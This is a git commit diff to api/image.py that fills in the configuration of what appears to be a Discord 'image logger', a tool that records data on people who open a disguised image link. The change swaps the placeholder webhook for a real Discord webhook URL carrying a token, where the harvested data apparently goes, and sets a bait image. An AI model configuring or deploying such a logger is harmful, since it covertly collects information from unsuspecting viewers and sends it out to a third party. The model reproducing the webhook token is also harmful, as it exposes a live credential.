3a4ac25536beb30a47d05a85ec4e5f3726a49b5c
mxrcy6997-ctrl <mxrcy6997@gmail.com>
2025-11-15 09:39:45 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1439035687256195256/BnXd4jepWoknyKNfCbffz9Rrskk5xr8LfW7UhR87dBEO2twbGwJ2ILy_LHyGAmWiYhcv",
+    "image": "https://img.buzzfeed.com/buzzfeed-static/static/2017-02/28/10/asset/buzzfeed-prod-fastlane-01/sub-buzz-24899-1488294942-4.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
